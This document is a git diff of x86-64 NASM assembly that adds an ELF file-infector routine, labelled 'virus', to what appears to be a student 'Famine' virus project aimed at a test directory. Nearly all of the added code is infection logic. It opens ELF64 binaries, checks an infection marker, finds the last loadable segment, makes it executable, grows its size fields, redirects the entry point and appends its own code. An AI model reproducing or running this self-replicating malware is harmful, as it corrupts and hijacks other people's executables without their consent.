@@ -1,13 +1,55 @@
 BITS 64
 default rel
+
+%define SYS_read		0
 %define SYS_write		1
 %define SYS_open		2
 %define SYS_close		3
+%define SYS_pread64		17
+%define SYS_pwrite64	18
 %define SYS_getdents64	217
 %define SYS_exit		60
 %define O_RDONLY		0
 %define SYS_openat		257
 %define AT_FDCWD  -100
+
+%macro PUSH_ALL 0
+		push	rax
+		push	rbx
+		push	rcx
+		push	rdx
+		push	rsi
+		push	rdi
+		push	rbp
+		push	r8
+		push	r9
+		push	r10
+		push	r11
+		push	r12
+		push	r13
+		push	r14
+		push	r15
+%endmacro
+
+%macro POP_ALL 0
+		pop		r15
+		pop		r14
+		pop		r13
+		pop		r12
+		pop		r11
+		pop		r10
+		pop		r9
+		pop		r8
+		pop		rbp
+		pop		rdi
+		pop		rsi
+		pop		rdx
+		pop		rcx
+		pop		rbx
+		pop		rax
+%endmacro
+
+
 section .text
 	global _start
 
@@ -15,14 +57,26 @@ section .text
 
 
 _start:
+	PUSH_ALL
 	jmp		end_
 
 	buff	times 4096 db 0
 	newl	times 0001 db 0xa
-	path	db '/', 0
+	path	db '/root/famine/test_dir/', 0
 	padd	times 0512 db 0
+	file	db 'elf64 found!', 0
 	last	db '..', 0
 	curr	db '.', 0
+	elfh	db 0x7f, 'ELF'
+	one		db 1
+	entry	dq 0
+	exec	dw 7
+	elfb	times 0064 db 0
+	elfp0	times 0056 db 0
+	elfp1	times 0056 db 0
+
+
+
 
 	printf: ; lea rsi
 		push	rax
@@ -93,6 +147,9 @@ _start:
 		push	rsi
 		push	rdi
 		push	rdx
+		push	r12
+
+		mov		r12, rax
 		xor		rcx, rcx
 		xor		rdx, rdx
 		.loop:
@@ -115,10 +172,15 @@ _start:
 				mov		rax, rcx
 				rep		movsb
 				xchg	rsi, rdi
+
+				cmp		r12, 4
+				jne		.file
 				mov		[rsi - 1], byte '/'
 				mov		[rsi], byte 0
+				.file:
 				sub		rsi, rax
 				sub		rsi, rdx
+		pop		r12
 		pop		rdx
 		pop		rdi
 		pop		rsi
@@ -259,10 +321,24 @@ _start:
 
 			jmp		.no_print
 		.file:
-			;call	printf logique des fichier
+			;call	printf ;logique des fichier
 
 
 
+
+			push	rdi
+			push	rsi
+			push	rax
+			lea		rdi, [rel path]
+			xchg	rsi, rdi
+			call	add_val
+			pop		rax
+			pop		rsi
+			pop		rdi
+
+			;call	printf
+
+			call	virus
 
 
 
@@ -276,13 +352,6 @@ _start:
 		.done:
 
 
-
-
-
-
-
-
-
 		pop		rdi
 		mov		rax, SYS_close
 		syscall
@@ -293,10 +362,227 @@ _start:
 		pop		rax
 		pop		r12
 	ret
+
+
+	virus:		; rsi nom du fichier
+		PUSH_ALL
+
+
+		mov		rax, SYS_open
+		lea		rdi, [rel path]
+		mov		rsi, 2
+		xor		rdx, rdx
+		syscall
+
+		lea		rsi, [rel path]
+		call	sub_val
+
+		cmp		rax, 0
+		jle		.return
+		mov		r12, rax
+
+		lea		rdi, [rel elfb]	; Cleaning du buffer elfb -> La ou y va avoir le elf header
+		mov		rcx, 8
+		xor		rax, rax
+		rep		stosq
+
+		lea		rdi, [rel elfp0]	; Cleaning du buffer elfp0
+		mov		rcx, 7
+		xor		rax, rax
+		rep		stosq
+
+		lea		rdi, [rel elfp1]	; Cleaning du buffer elfp1
+		mov		rcx, 7
+		xor		rax, rax
+		rep		stosq
+
+		mov		rax, SYS_read
+		mov		rdi, r12
+		lea		rsi, [rel elfb]
+		mov		rdx, 64
+		syscall
+		; START - CHECKS - ELF64
+		mov		rcx, 4
+		lea		rsi, [rel elfh]
+		lea		rdi, [rel elfb]
+		repe	cmpsb
+		test	rcx, rcx
+		jnz		.close_file		; On verifie le nombre magique
+
+		cmp		byte [rel elfb + 4], 2	; On verifie que c'est bien un elf64
+		jne		.close_file
+
+		mov		al, [rel elfb + 0xa]	; Check si deja infecte
+		test	al, al
+		jnz		.close_file
+		; END - CHECKS - ELF64
+
+
+		movzx	rcx, word [rel elfb + 0x38]
+		movzx	rdi, word [rel elfb + 0x36]
+		xor		r11, r11
+		xor		r10, r10
+
+		.start_loop_phdr:
+			test	rcx, rcx
+			jz		.end_loop_phdr
+			mov		r10, rcx
+			imul	r10, rdi
+			add		r10, 64
+			push	r11
+			push	rcx
+			push	rdi
+			mov		rdi, r12
+			mov		rdx, 0x38
+			lea		rsi, [rel elfp0]
+			mov		rax, SYS_pread64
+			syscall
+			pop		rdi
+			pop		rcx
+			pop		r11
+			; r9 -> target_phdr offset
+			cmp		dword [rel elfp0], 1 ; est-ce un load ?
+			jne		.next_it_phdr
+			mov		rax, qword [rel elfp0 + 0x08]  ; p_offset
+			add		rax, qword [rel elfp0 + 0x20] ; p_filesz
+
+			cmp		rax, r11
+			jna		.next_it_phdr
+			mov		r11, rax
+			mov		r9, r10
+
+			push	r11
+			push	rcx
+			push	rdi
+			mov		rdi, r12
+			mov		rdx, 0x38
+			lea		rsi, [rel elfp1]
+			mov		rax, SYS_pread64
+			syscall
+			pop		rdi
+			pop		rcx
+			pop		r11
+
+
+		.next_it_phdr:
+			dec		rcx
+			jmp		.start_loop_phdr
+		.end_loop_phdr:
+			test	r11, r11
+			jz		.close_file
+
+			push	r9
+			push	r11
+			mov		rax, SYS_pwrite64
+			mov		rdi, r12
+			lea		rsi, [rel one]
+			mov		rdx, 1
+			mov		r10, 0xa
+			syscall
+			pop		r11
+			pop		r9
+
+
+			push	r11
+			mov		rax, [rel elfp1 + 0x8]
+			sub		r11, rax
+			mov		rax, [rel elfp1 + 0x10]
+			add		r11, rax
+			mov		[rel entry], r11
+			pop		r11
+
+
+			push	r9
+			push	r11
+			mov		rax, SYS_pwrite64
+			mov		rdi, r12
+			lea		rsi, [rel entry]
+			mov		rdx, 8
+			mov		r10, 0x18
+			syscall
+			pop		r11
+			pop		r9
+
+			push	r9
+			push	r11
+			mov		rax, SYS_pwrite64
+			mov		rdi, r12
+			lea		rsi, [rel exec]
+			mov		rdx, 4
+			mov		r10, r9
+			add		r10, 0x4
+			syscall
+			pop		r11
+			pop		r9
+
+			push	r11
+			lea		rdi, [rel _start]
+			lea		r11, [rel end_addr]
+			sub		r11, rdi
+
+			mov		rdi, [rel elfp1 + 0x20]
+			add		rdi, r11
+			mov		[rel elfp1 + 0x20], rdi
+
+			lea		rdi, [rel _start]
+			lea		r11, [rel end_addr]
+			sub		r11, rdi
+
+			mov		rdi, qword [rel elfp1 + 0x28]
+			add		rdi, r11
+			mov		[rel elfp1 + 0x28], rdi
+			pop		r11
+
+			push	r9
+			push	r11
+			mov		rax, SYS_pwrite64
+			mov		rdi, r12
+			lea		rsi, [rel elfp1 + 0x20]
+			mov		rdx, 8
+			mov		r10, r9
+			add		r10, 0x20
+			syscall
+			pop		r11
+			pop		r9
+
+			push	r9
+			push	r11
+			mov		rax, SYS_pwrite64
+			mov		rdi, r12
+			lea		rsi, [rel elfp1 + 0x28]
+			mov		rdx, 8
+			mov		r10, r9
+			add		r10, 0x28
+			syscall
+			pop		r11
+			pop		r9
+
+			push	r11
+			push	r9
+			lea		rsi, [rel _start]
+			lea		rdx, [rel end_addr]
+			sub		rdx, rsi
+			mov		r10, r11
+			mov		rdi, r12
+			mov		rax, SYS_pwrite64
+			syscall
+			pop		r9
+			pop		r11
+
+
+	.close_file:
+		mov		rax, SYS_close
+		mov		rdi, r12
+		syscall
+	.return:
+		POP_ALL
+	ret
+
 end_:
 
 	call	famine
 
+	POP_ALL
 	mov		rax, SYS_exit
 	xor		rdi, rdi
 	syscall
